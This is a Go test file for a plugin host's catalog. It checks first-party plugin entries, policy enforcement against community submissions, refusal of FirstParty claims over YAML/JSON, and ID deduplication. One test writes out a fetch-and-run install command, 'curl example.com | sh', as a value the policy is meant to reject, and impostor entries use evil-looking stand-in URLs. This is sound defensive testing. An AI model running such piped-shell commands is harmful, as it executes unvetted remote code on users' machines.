package plughost

import (
	"encoding/json"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// TestFirstPartyPlugRingItemsIncludesCloudfox pins the one entry part 3 of
// f4#1178 adds: cloudfox-plugin, marked FirstParty, with the same shape as
// plugins/cloudfox/cmd/cloudfox-plugin/plugring-manifest.json.
func TestFirstPartyPlugRingItemsIncludesCloudfox(t *testing.T) {
	items := FirstPartyPlugRingItems()
	if len(items) == 0 {
		t.Fatal("the first-party catalog is empty")
	}

	var cloudfox *PlugRingItem
	for i := range items {
		if items[i].ID == "cloudfox" {
			cloudfox = &items[i]
		}
	}
	if cloudfox == nil {
		t.Fatal("cloudfox is not in the first-party catalog")
	}
	if !cloudfox.FirstParty {
		t.Error("cloudfox is not marked FirstParty")
	}
	if cloudfox.Entrypoint != "cloudfox-plugin" {
		t.Errorf("entrypoint = %q, want cloudfox-plugin", cloudfox.Entrypoint)
	}
	if !strings.Contains(cloudfox.URL, "{os}") || !strings.Contains(cloudfox.URL, "{arch}") {
		t.Errorf("url = %q, want per-platform {os}/{arch} placeholders", cloudfox.URL)
	}
	if ok, reason := PlugRingItemRunsHere(*cloudfox); !ok {
		t.Errorf("cloudfox is reported unrunnable: %s", reason)
	}
}

// TestFirstPartyPlugRingItemsIncludesAndroid is the equivalent pin for the
// entry android-plugin's own part 3 adds, mirroring
// plugins/android/cmd/android-plugin/plugring-manifest.json.
func TestFirstPartyPlugRingItemsIncludesAndroid(t *testing.T) {
	items := FirstPartyPlugRingItems()

	var android *PlugRingItem
	for i := range items {
		if items[i].ID == "android" {
			android = &items[i]
		}
	}
	if android == nil {
		t.Fatal("android is not in the first-party catalog")
	}
	if !android.FirstParty {
		t.Error("android is not marked FirstParty")
	}
	if android.Entrypoint != "android-plugin" {
		t.Errorf("entrypoint = %q, want android-plugin", android.Entrypoint)
	}
	if !strings.Contains(android.URL, "{os}") || !strings.Contains(android.URL, "{arch}") {
		t.Errorf("url = %q, want per-platform {os}/{arch} placeholders", android.URL)
	}
	if ok, reason := PlugRingItemRunsHere(*android); !ok {
		t.Errorf("android is reported unrunnable: %s", reason)
	}
	if problem := PlugRingItemProblem(*android); problem != "" {
		t.Errorf("the first-party android entry was rejected: %s", problem)
	}
}

// TestFirstPartyBypassesTheCommunityPolicyThatWouldRejectIt is the point of
// this whole file: the fields that make PlugRingItemProblem reject an
// ordinary community entry -- a per-platform URL, an entrypoint that is not a
// bare .lua or .wasm file -- are accepted precisely because, and only
// because, FirstParty is set.
func TestFirstPartyBypassesTheCommunityPolicyThatWouldRejectIt(t *testing.T) {
	cloudfox := FirstPartyPlugRingItems()[0]

	if problem := PlugRingItemProblem(cloudfox); problem != "" {
		t.Errorf("the first-party cloudfox entry was rejected: %s", problem)
	}

	// The exact same fields, submitted the way a third party would have to,
	// without FirstParty: the community distribution policy still applies in
	// full. If this ever starts passing, PlugRingItemProblem has stopped
	// enforcing PLUGRING.md for everybody else.
	asCommunitySubmission := cloudfox
	asCommunitySubmission.FirstParty = false
	if problem := PlugRingItemProblem(asCommunitySubmission); problem == "" {
		t.Fatal("the same entry without FirstParty was accepted; the community policy is not being enforced")
	}

	// setup_cmd stays refused for everybody, first-party included: nothing
	// about being first-party should turn on running an arbitrary command at
	// install time.
	withSetupCmd := cloudfox
	withSetupCmd.SetupCmd = "curl example.com | sh"
	if problem := PlugRingItemProblem(withSetupCmd); problem == "" {
		t.Fatal("a first-party entry with setup_cmd was accepted")
	}
}

// TestFirstPartyCannotBeSetFromTheWire is the property the design leans on:
// plugring/index.yaml and any remote catalog f4 downloads are decoded
// straight into PlugRingItem, so a community submission that tries to claim
// FirstParty for itself must not succeed.
func TestFirstPartyCannotBeSetFromTheWire(t *testing.T) {
	yamlSrc := `
id: "evil"
entrypoint: "evil-native"
url: "https://example.com/evil-{os}-{arch}.zip"
firstparty: true
FirstParty: true
`
	var fromYAML PlugRingItem
	if err := yaml.Unmarshal([]byte(yamlSrc), &fromYAML); err != nil {
		t.Fatalf("yaml.Unmarshal: %v", err)
	}
	if fromYAML.FirstParty {
		t.Fatal("a YAML catalog entry set FirstParty; a community entry can now impersonate a first-party plugin")
	}
	if problem := PlugRingItemProblem(fromYAML); problem == "" {
		t.Fatal("an entry that only claims FirstParty over YAML escaped the community policy")
	}

	jsonSrc := `{"id":"evil","entrypoint":"evil-native","url":"https://example.com/evil-{os}-{arch}.zip","FirstParty":true,"firstParty":true}`
	var fromJSON PlugRingItem
	if err := json.Unmarshal([]byte(jsonSrc), &fromJSON); err != nil {
		t.Fatalf("json.Unmarshal: %v", err)
	}
	if fromJSON.FirstParty {
		t.Fatal("a JSON catalog entry set FirstParty; a community entry can now impersonate a first-party plugin")
	}
}

// TestMergeFirstPartyPlugRingItemsAppendsAndDedupsByID checks the merge that
// feeds the PlugRing dialog: unrelated community entries survive, and a
// community entry that collides on id with a first-party one is shadowed by
// the first-party entry rather than the other way around.
func TestMergeFirstPartyPlugRingItemsAppendsAndDedupsByID(t *testing.T) {
	community := []PlugRingItem{
		{ID: "hello-plugring", Name: "Hello", Entrypoint: "hello.lua"},
		{
			ID:         "cloudfox",
			Name:       "Impostor",
			Entrypoint: "evil.lua",
			URL:        "https://evil.example/x.lua",
		},
	}
	merged := MergeFirstPartyPlugRingItems(community)

	byID := make(map[string]PlugRingItem, len(merged))
	for _, item := range merged {
		if _, dup := byID[item.ID]; dup {
			t.Fatalf("id %q appears more than once in the merged catalog", item.ID)
		}
		byID[item.ID] = item
	}

	if _, ok := byID["hello-plugring"]; !ok {
		t.Error("an unrelated community entry was dropped by the merge")
	}

	cloudfox, ok := byID["cloudfox"]
	if !ok {
		t.Fatal("cloudfox is missing from the merged catalog")
	}
	if !cloudfox.FirstParty || cloudfox.Name != "Cloud storage (CloudFox)" {
		t.Errorf("a community entry with a colliding id shadowed the first-party one: %+v", cloudfox)
	}
	// hello-plugring (unrelated, survives) + cloudfox + android (the two
	// first-party entries, f4#1178 parts 3 of 4) = 3. The colliding
	// "impostor" cloudfox community entry above is shadowed, not counted.
	if len(merged) != 3 {
		t.Errorf("len(merged) = %d, want 3 (no duplicate cloudfox entry, plus android)", len(merged))
	}
	if _, ok := byID["android"]; !ok {
		t.Error("android is missing from the merged catalog")
	}

	// A community catalog with no collision keeps its own entries and gains
	// the first-party ones on top.
	noCollision := MergeFirstPartyPlugRingItems([]PlugRingItem{
		{ID: "hello-plugring", Name: "Hello", Entrypoint: "hello.lua"},
	})
	if len(noCollision) != 3 {
		t.Fatalf("len(noCollision) = %d, want 3", len(noCollision))
	}
}
